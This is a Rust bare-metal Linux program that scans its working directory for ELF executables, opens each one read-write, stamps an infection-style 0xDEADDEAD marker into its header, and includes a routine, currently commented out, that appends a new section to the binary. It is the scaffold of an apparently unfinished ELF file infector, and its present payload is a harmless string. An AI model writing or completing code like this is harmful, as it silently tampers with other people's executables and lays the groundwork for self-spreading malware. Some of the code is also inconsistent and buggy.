#![no_std]
#![no_main]

use core::panic::PanicInfo;
use core::mem;
use core::ptr;
use core::mem::MaybeUninit;

const SYS_EXIT: usize = 60;
const SYS_READ: usize = 0;
const SYS_WRITE: usize = 1;
const SYS_OPEN: usize = 2;
const SYS_CLOSE: usize = 3;
const SYS_PREAD64: usize = 17;
const SYS_PWRITE64: usize = 18;
const SYS_OPENAT: usize = 257;
const SYS_GETDENTS64: usize = 217;
const SYS_FSTAT: usize = 5;

const AT_FDCWD: isize = -100;
const O_RDONLY: usize = 0;
const O_RDWR: usize = 2;
const O_NONBLOCK: usize = 0x4000;
const O_DIRECTORY: usize = 0x200000;
const O_CLOEXEC: usize = 0x2000000;

const STDOUT: usize = 1;

const S_IFMT: u32 = 0o170000;
const S_IFDIR: u32 = 0o040000;

const ELF_MAGIC: [u8; 4] = [0x7f, b'E', b'L', b'F'];
const MAX_PATH_LEN: usize = 256;
const BUFFER_SIZE: usize = 1024;
const MAX_SECTIONS: usize = 128;
const MAX_STRTAB_SIZE: usize = 1024;

const SIGNATURE: u32 = 0xDEADDEAD;
const NEW_SECTION_NAME: &[u8] = b".newsec\0";
const NEW_SECTION_DATA: &[u8] = b"Hello, new section!\0";

#[repr(C)]
struct LinuxStat {
    st_dev: u64,
    st_ino: u64,
    st_nlink: u64,
    st_mode: u32,
    st_uid: u32,
    st_gid: u32,
    __pad0: u32,
    st_rdev: u64,
    st_size: i64,
    st_blksize: i64,
    st_blocks: i64,
    st_atime: i64,
    st_atime_nsec: i64,
    st_mtime: i64,
    st_mtime_nsec: i64,
    st_ctime: i64,
    st_ctime_nsec: i64,
    __unused: [i64; 3],
}

#[repr(C)]
struct LinuxDirent64 {
    d_ino: u64,
    d_off: i64,
    d_reclen: u16,
    d_type: u8,
    d_name: [u8; 256],
}

#[repr(C)]
struct ElfHeader {
    e_ident: [u8; 16],
    e_type: u16,
    e_machine: u16,
    e_version: u32,
    e_entry: u64,
    e_phoff: u64,
    e_shoff: u64,
    e_flags: u32,
    e_ehsize: u16,
    e_phentsize: u16,
    e_phnum: u16,
    e_shentsize: u16,
    e_shnum: u16,
    e_shstrndx: u16,
}

#[repr(C)]
struct Elf64_Shdr {
    sh_name: u32,
    sh_type: u32,
    sh_flags: u64,
    sh_addr: u64,
    sh_offset: u64,
    sh_size: u64,
    sh_link: u32,
    sh_info: u32,
    sh_addralign: u64,
    sh_entsize: u64,
}

#[no_mangle]
pub extern "C" fn _start() -> ! {
    let fd = open_directory(b".\0");
    check_file_status(fd);
    read_directory_entries(fd);
    unsafe { syscall(SYS_CLOSE, fd, 0, 0); }
    exit(0);
}

fn open_directory(dir: &[u8]) -> usize {
    print_str(b"Opening directory...\n");
    let fd = unsafe {
        syscall(
            SYS_OPENAT,
            AT_FDCWD as usize,
            dir.as_ptr() as usize,
            O_RDONLY|O_NONBLOCK|O_CLOEXEC
        )
    };
    if fd > isize::MAX as usize {
        print_str(b"Error opening directory: ");
        print_isize(-(fd as isize));
        print_str(b"\n");
        exit(1);
    }
    print_str(b"File opened successfully. FD: ");
    print_usize(fd);
    print_str(b"\n");
    fd
}

fn check_file_status(fd: usize) {
    let mut statbuf: MaybeUninit<LinuxStat> = 
        MaybeUninit::uninit();
    let fstat_result = unsafe {
        syscall(
            SYS_FSTAT,
            fd, 
            statbuf.as_mut_ptr() as usize, 
            0
        )
    };
    if fstat_result > isize::MAX as usize {
        print_str(b"Error checking file status. Error code: ");
        print_isize(-(fstat_result as isize));
        print_str(b"\n");
        unsafe { syscall(SYS_CLOSE, fd, 0, 0); }
        exit(1);
    }
    let st_mode = unsafe { 
        (*statbuf.as_ptr()).st_mode 
    };
    print_str(b"File mode: ");
    print_usize(st_mode as usize);
    print_str(b"\n");
}

fn read_directory_entries(fd: usize) {
    print_str(b"Reading directory entries...\n");
    let mut buffer: [MaybeUninit<u8>; BUFFER_SIZE] = 
        unsafe { MaybeUninit::uninit().assume_init() };

    let bytes_read = unsafe {
        syscall(
            SYS_GETDENTS64,
            fd, 
            buffer.as_mut_ptr() as usize, 
            BUFFER_SIZE
        )
    };
    print_str(b"Syscall return value: ");
    print_usize(bytes_read);
    print_str(b"\n");

    if bytes_read > isize::MAX as usize {
        print_str(b"Error reading directory: ");
        print_usize(!bytes_read + 1);
        print_str(b"\n");
    } else {
        print_str(b"Directory bytes read: ");
        print_usize(bytes_read);
        print_str(b"\n");

        process_directory_entries(
            fd, 
            &buffer, 
            bytes_read
        );
    }
}

fn process_directory_entries(fd: usize, 
    buffer: &[MaybeUninit<u8>; BUFFER_SIZE], 
    bytes_read: usize) {
    let buffer = unsafe { 
        &*(buffer.as_ptr() as 
                *const [u8; BUFFER_SIZE]) 
    };

    let mut offset = 0;
    while offset < bytes_read {
        let dirent = unsafe { 
            &*(buffer.as_ptr().add(offset) 
                as *const LinuxDirent64) 
        };

        if dirent.d_type == 8 {
            process_file(fd, dirent);
        }
        offset += dirent.d_reclen as usize;
    }
}

fn process_file(fd: usize, dirent: &LinuxDirent64) {
    let name_len = dirent.d_name.iter()
        .position(|&c| c == 0).unwrap_or(256);

    let file = match File::open(
        &dirent.d_name[..name_len], O_RDWR) {
        Ok(file) => file,
        Err(e) => {
            print_str(b"Error opening file: ");
            print_isize(e);
            print_str(b"\n");
            return;
        }
    };

    let file_size = match file.size() {
        Ok(size) => size,
        Err(e) => {
            print_str(b"Error getting file size: ");
            print_isize(e);
            print_str(b"\n");
            return;
        }
    };

    if file_size < 120 {
        print_str(b"File too small to be an ELF\n");
        return;
    }

    let mut elf_header 
        = MaybeUninit::<ElfHeader>::uninit();
    let elf_header_slice = unsafe {
        core::slice::from_raw_parts_mut(
            elf_header.as_mut_ptr() as *mut u8,
            core::mem::size_of::<ElfHeader>()
        )
    };

    match file.read(elf_header_slice) {
        Ok(bytes_read) => {
            if bytes_read != core::mem::size_of::<ElfHeader>() {
                print_str(b"Failed to read complete ELF header. Bytes read: ");
                print_usize(bytes_read);
                print_str(b"\n");
                return;
            }
        },
        Err(e) => {
            print_str(b"Error reading ELF header. Error code: ");
            print_isize(e);
            print_str(b"\n");
            return;
        }
    }

    let header = unsafe { elf_header.assume_init_ref() };

    if !is_elf_file(header) {
        print_str(b"Not an ELF file\n");
        return;
    }

    print_str(b"ELF file found: ");
    print_str(&dirent.d_name[..name_len]);
    print_str(b"\n");

    if is_file_processed(&header.e_ident[8..12]) {
        print_str(b"File already processed\n");
        return;
    }

    let signature_bytes = SIGNATURE.to_le_bytes();
    match file.pwrite(&signature_bytes, 8) {
        Ok(4) => print_str(b"ELF header modified with signature\n"),
        Ok(n) => {
            print_str(b"Failed to write full signature. Bytes written: ");
            print_usize(n);
            print_str(b"\n");
        }
        Err(e) => {
            print_str(b"Error writing signature. Error code: ");
            print_isize(e);
            print_str(b"\n");
        }
    }

    // if add_section(&file, header) {
    //     print_str(b"New section added successfully\n");
    // } else {
    //     print_str(b"Failed to add new section\n");
    // }

    // let file_fd = unsafe {
    //     syscall3(
    //         SYS_OPENAT, 
    //         fd, 
    //         dirent.d_name.as_ptr() as usize, 
    //         O_RDWR
    //     )
    // };

    // if file_fd > isize::MAX as usize {
    //     print_str(b"Error opening file. Error code: ");
    //     print_isize(-(file_fd as isize));
    //     print_str(b"\n");
    //     return;
    // }

    // print_str(b"File opened successfully. FD: ");
    // print_usize(file_fd);
    // print_str(b"\n");

    // // Check the file size
    // let mut statbuf: MaybeUninit<LinuxStat> 
    //     = MaybeUninit::uninit();

    // let fstat_result = unsafe {
    //     syscall(
    //         SYS_FSTAT,
    //         file_fd,
    //         statbuf.as_mut_ptr() as usize,
    //         0
    //     )
    // };

    // if fstat_result != 0 {
    //     print_str(b"Error getting file status: ");
    //     print_isize(-(fstat_result as isize));
    //     print_str(b"\n");
    //     unsafe { syscall1(SYS_CLOSE, file_fd); }
    //     return;
    // }

    // let file_size = unsafe { 
    //     (*statbuf.as_ptr()).st_size 
    // };

    // print_str(b"File size: ");
    // print_isize(file_size as isize);
    // print_str(b" bytes\n");

    // // No ELF should be less than 120 bytes
    // if file_size < 120 {
    //     print_str(b"File too small to be an ELF\n");
    //     unsafe { syscall1(SYS_CLOSE, file_fd); }
    //     return;
    // }
    
    // let mut elf_header 
    //     = MaybeUninit::<ElfHeader>::uninit();

    // let mut bytes_read = unsafe {
    //     syscall3(
    //         SYS_READ, 
    //         file_fd, 
    //         elf_header.as_mut_ptr() as usize,
    //         core::mem::size_of::<ElfHeader>()
    //     )
    // };

    // let mut header = unsafe { 
    //     elf_header.assume_init_ref() 
    // };

    // if bytes_read == core::mem::size_of::<ElfHeader>()
    //     && !is_elf_file(&header) 
    // {
    //     return
    // } 

    // print_str(b"ELF file found: ");
    // print_str(&dirent.d_name[..name_len]);
    // print_str(b"\n");

    // if is_file_processed(&header.e_ident[8..12]) {
    //     print_str(b"File already processed\n");
    //     return
    // }

    // let signature_bytes = SIGNATURE.to_le_bytes();

    // // Write the signature as a single 4-byte write
    // let bytes_written = unsafe {
    //     syscall4(
    //         SYS_PWRITE64,
    //         file_fd,
    //         signature_bytes.as_ptr() as usize,
    //         4,
    //         8 // Offset: start writing at byte 8 of e_ident
    //     )
    // };

    // if bytes_written == 4 {
    //     print_str(b"ELF header modified with signature\n");
    // } else {
    //     print_str(b"Failed to write signature. Bytes written: ");
    //     print_isize(bytes_written as isize);
    // }

    // //add_section(file_fd, header);

    // unsafe { syscall1(SYS_CLOSE, file_fd); }
}

fn get_file_size(fd: usize) -> usize
{
    let mut statbuf 
        = MaybeUninit::<LinuxStat>::uninit();
    let result = unsafe { 
        syscall(
            SYS_FSTAT, 
            fd, 
            statbuf.as_mut_ptr() as usize, 
            0
        ) 
    };

    result
}

fn is_elf_file(header: &ElfHeader) -> bool {
    header.e_ident[0..4] == ELF_MAGIC
}

fn is_file_processed(padding: &[u8]) -> bool {
    return false
    // let signature_bytes = SIGNATURE.to_le_bytes();
    // padding == signature_bytes
}

fn add_section(file_fd: usize, elf_header: &ElfHeader) -> bool {
    print_str(b"1. Starting add_section\n");
    let shoff = elf_header.e_shoff;
    let shentsize = elf_header.e_shentsize as usize;
    let shnum = elf_header.e_shnum as usize;

    print_str(b"Section header offset (shoff): ");
    print_usize(shoff as usize);
    print_str(b"\n");

    print_str(b"Section header entry size (shentsize): ");
    print_usize(shentsize);
    print_str(b"\n");

    print_str(b"Number of section headers (shnum): ");
    print_usize(shnum);
    print_str(b"\n");

    if shnum > MAX_SECTIONS {
        print_str(b"2. Too many sections\n");
        return false;
    }

    print_str(b"3. Reading section header table\n");
    let mut section_headers: [MaybeUninit<Elf64_Shdr>; MAX_SECTIONS] = unsafe { MaybeUninit::uninit().assume_init() };
    
    for i in 0..shnum {
        let bytes_read = unsafe {
            syscall4(
                SYS_PREAD64,
                file_fd,
                section_headers[i].as_mut_ptr() as usize,
                shentsize,
                (shoff + (i * shentsize) as u64) as usize
            )
        };
        if bytes_read != shentsize as isize {
            print_str(b"4. Failed to read section header\n");
            print_str(b"Bytes read: ");
            print_isize(bytes_read);
            print_str(b"\n");
            print_str(b"Expected bytes: ");
            print_usize(shentsize);
            print_str(b"\n");
            print_str(b"Section index: ");
            print_usize(i);
            print_str(b"\n");
            return false;
        }
    }

    print_str(b"5. Creating new section header\n");
    let mut new_section = Elf64_Shdr {
        sh_name: 0,
        sh_type: 1,
        sh_flags: 0,
        sh_addr: 0,
        sh_offset: 0,
        sh_size: NEW_SECTION_DATA.len() as u64,
        sh_link: 0,
        sh_info: 0,
        sh_addralign: 1,
        sh_entsize: 0,
    };

    print_str(b"6. Getting file size\n");
    let mut statbuf = MaybeUninit::<LinuxStat>::uninit();
    if unsafe { syscall(SYS_FSTAT, file_fd, statbuf.as_mut_ptr() as usize, 0) } != 0 {
        print_str(b"7. Failed to get file size\n");
        return false;
    }
    let file_size = unsafe { statbuf.assume_init().st_size as u64 };
    new_section.sh_offset = file_size;

    print_str(b"8. Updating ELF header\n");
    let mut new_elf_header = ElfHeader {
        e_ident: elf_header.e_ident,
        e_type: elf_header.e_type,
        e_machine: elf_header.e_machine,
        e_version: elf_header.e_version,
        e_entry: elf_header.e_entry,
        e_phoff: elf_header.e_phoff,
        e_shoff: elf_header.e_shoff,
        e_flags: elf_header.e_flags,
        e_ehsize: elf_header.e_ehsize,
        e_phentsize: elf_header.e_phentsize,
        e_phnum: elf_header.e_phnum,
        e_shentsize: elf_header.e_shentsize,
        e_shnum: elf_header.e_shnum + 1,
        e_shstrndx: elf_header.e_shstrndx,
    };
    
    print_str(b"9. Writing new section data\n");
    let bytes_written = unsafe {
        syscall4(
            SYS_PWRITE64,
            file_fd,
            NEW_SECTION_DATA.as_ptr() as usize,
            NEW_SECTION_DATA.len(),
            file_size as usize
        )
    };
    if bytes_written != NEW_SECTION_DATA.len() as isize {
        print_str(b"10. Failed to write new section data\n");
        return false;
    }

    print_str(b"11. Updating section name string table\n");
    let shstrtab = unsafe { section_headers[elf_header.e_shstrndx as usize].assume_init_ref() };
    let mut strtab: [MaybeUninit<u8>; MAX_STRTAB_SIZE] = unsafe { MaybeUninit::uninit().assume_init() };
    let bytes_read = unsafe {
        syscall4(
            SYS_PREAD64,
            file_fd,
            strtab.as_mut_ptr() as usize,
            core::cmp::min(shstrtab.sh_size as usize, MAX_STRTAB_SIZE),
            shstrtab.sh_offset as usize
        )
    };
    if bytes_read != core::cmp::min(shstrtab.sh_size as isize, MAX_STRTAB_SIZE as isize) {
        print_str(b"12. Failed to read string table\n");
        return false;
    }
    
    let new_name_offset = shstrtab.sh_size;
    if (new_name_offset as usize + NEW_SECTION_NAME.len()) > MAX_STRTAB_SIZE {
        print_str(b"13. String table overflow\n");
        return false;
    }
    for (i, &byte) in NEW_SECTION_NAME.iter().enumerate() {
        unsafe { *strtab[new_name_offset as usize + i].as_mut_ptr() = byte; }
    }
    new_section.sh_name = new_name_offset as u32;

    print_str(b"14. Writing updated string table\n");
    let bytes_written = unsafe {
        syscall4(
            SYS_PWRITE64,
            file_fd,
            strtab.as_ptr() as usize,
            new_name_offset as usize + NEW_SECTION_NAME.len(),
            shstrtab.sh_offset as usize
        )
    };
    if bytes_written != (new_name_offset as usize + NEW_SECTION_NAME.len()) as isize {
        print_str(b"15. Failed to write updated string table\n");
        return false;
    }

    print_str(b"16. Writing new section header\n");
    let bytes_written = unsafe {
        syscall4(
            SYS_PWRITE64,
            file_fd,
            &new_section as *const Elf64_Shdr as usize,
            core::mem::size_of::<Elf64_Shdr>(),
            (shoff + (shnum * shentsize) as u64) as usize
        )
    };
    if bytes_written != core::mem::size_of::<Elf64_Shdr>() as isize {
        print_str(b"17. Failed to write new section header\n");
        return false;
    }

    print_str(b"18. Writing updated ELF header\n");
    let bytes_written = unsafe {
        syscall4(
            SYS_PWRITE64,
            file_fd,
            &new_elf_header as *const ElfHeader as usize,
            core::mem::size_of::<ElfHeader>(),
            0
        )
    };
    if bytes_written != core::mem::size_of::<ElfHeader>() as isize {
        print_str(b"19. Failed to write updated ELF header\n");
        return false;
    }

    print_str(b"20. Add section completed successfully\n");
    true
}

#[inline(always)]
unsafe fn syscall(
    id: usize, 
    arg1: usize,
    arg2: usize,
    arg3: usize
) -> usize {
    let ret: usize;
    core::arch::asm!(
        "syscall",
        in("rax") id,
        in("rdi") arg1,
        in("rsi") arg2,
        in("rdx") arg3,
        lateout("rax") ret,
    );
    ret
}

unsafe fn syscall1(n: usize, a1: usize) -> usize {
    let ret: usize;
    core::arch::asm!(
        "syscall",
        in("rax") n,
        in("rdi") a1,
        out("rcx") _,
        out("r11") _,
        lateout("rax") ret,
    );
    ret
}

unsafe fn syscall3(
    n: usize,
    a1: usize, 
    a2: usize,
    a3: usize
) -> usize {
    let ret: usize;
    core::arch::asm!(
        "syscall",
        in("rax") n,
        in("rdi") a1,
        in("rsi") a2,
        in("rdx") a3,
        out("rcx") _,
        out("r11") _,
        lateout("rax") ret,
    );
    ret
}

unsafe fn syscall4(num: usize, arg1: usize, arg2: usize, arg3: usize, arg4: usize) -> isize {
    let ret: isize;
    core::arch::asm!(
        "syscall",
        in("rax") num,
        in("rdi") arg1,
        in("rsi") arg2,
        in("rdx") arg3,
        in("r10") arg4,
        out("rcx") _, // clobbered by syscall
        out("r11") _, // clobbered by syscall
        lateout("rax") ret,
    );
    ret
}

#[inline(always)]
fn exit(code: usize) -> ! {
    unsafe {
        syscall(SYS_EXIT, code, 0, 0);
    }
    loop {}
}

struct File {
    fd: usize,
}

impl File {
    fn open(path: &[u8], flags: usize) -> Result<Self, isize> {
        let fd = unsafe {
            syscall3(
                SYS_OPENAT,
                AT_FDCWD as usize,
                path.as_ptr() as usize,
                flags
            )
        };
        
        if fd > isize::MAX as usize {
            let error = -(fd as isize);
            print_str(b"Open error code: ");
            print_isize(error);
            print_str(b"\n");
            Err(error)
        } else {
            Ok(File { fd })
        }
    }

    fn read(&self, buf: &mut [u8]) -> Result<usize, isize> {
        let bytes_read = unsafe {
            syscall3(
                SYS_READ,
                self.fd,
                buf.as_mut_ptr() as usize,
                buf.len()
            )
        };
        if bytes_read > isize::MAX as usize {
            Err(-(bytes_read as isize))
        } else {
            Ok(bytes_read)
        }
    }

    fn write(&self, buf: &[u8]) -> Result<usize, isize> {
        let bytes_written = unsafe {
            syscall3(
                SYS_WRITE,
                self.fd,
                buf.as_ptr() as usize,
                buf.len()
            )
        };
        if bytes_written > isize::MAX as usize {
            Err(-(bytes_written as isize))
        } else {
            Ok(bytes_written)
        }
    }

    fn pwrite(&self, buf: &[u8], offset: usize) -> Result<usize, isize> {
        let bytes_written = unsafe {
            syscall4(
                SYS_PWRITE64,
                self.fd,
                buf.as_ptr() as usize,
                buf.len(),
                offset
            )
        };
        if bytes_written > isize::MAX {
            Err(-(bytes_written as isize))
        } else {
            Ok(bytes_written as usize)
        }
    }

    fn pread(&self, buf: &mut [u8], offset: usize) -> Result<usize, isize> {
        let bytes_read = unsafe {
            syscall4(
                SYS_PREAD64,
                self.fd,
                buf.as_mut_ptr() as usize,
                buf.len(),
                offset
            )
        };
        if bytes_read > isize::MAX {
            Err(-(bytes_read as isize))
        } else {
            Ok(bytes_read as usize)
        }
    }

    fn size(&self) -> Result<usize, isize> {
        let mut statbuf = MaybeUninit::<LinuxStat>::uninit();
        let result = unsafe { syscall(SYS_FSTAT, self.fd, statbuf.as_mut_ptr() as usize, 0) };
        if result != 0 {
            Err(-(result as isize))
        } else {
            Ok(unsafe { statbuf.assume_init().st_size as usize })
        }
    }

    fn close(self) -> Result<(), isize> {
        let result = unsafe { syscall1(SYS_CLOSE, self.fd) };
        if result != 0 {
            Err(-(result as isize))
        } else {
            Ok(())
        }
    }
}

fn print_isize(mut n: isize) {
    if n == 0 {
        print_char(b'0');
        return;
    }
    if n < 0 {
        print_char(b'-');
        if n == isize::MIN {
            print_str(b"9223372036854775808");
            return;
        }
        n = -n;
    }
    print_usize(n as usize);
}

fn print_usize(mut n: usize) {
    if n == 0 {
        return;
    }
    let digits = b"0123456789";
    let mut digit_count = 0;
    let mut temp = n;
    while temp > 0 {
        digit_count += 1;
        temp /= 10;
    }
    while digit_count > 0 {
        digit_count -= 1;
        let digit = (
            n / 10_usize.pow(digit_count as u32)
        ) % 10;
        print_char(digits[digit]);
    }
}

fn print_char(c: u8) {
    unsafe {
        syscall(
            SYS_WRITE, 
            STDOUT, 
            &c as *const u8 as usize, 
            1
        );
    }
}

fn print_str(s: &[u8]) {
    unsafe {
        syscall(
            SYS_WRITE,
            STDOUT, 
            s.as_ptr() as usize,
            s.len()
        );
    }
}

#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}
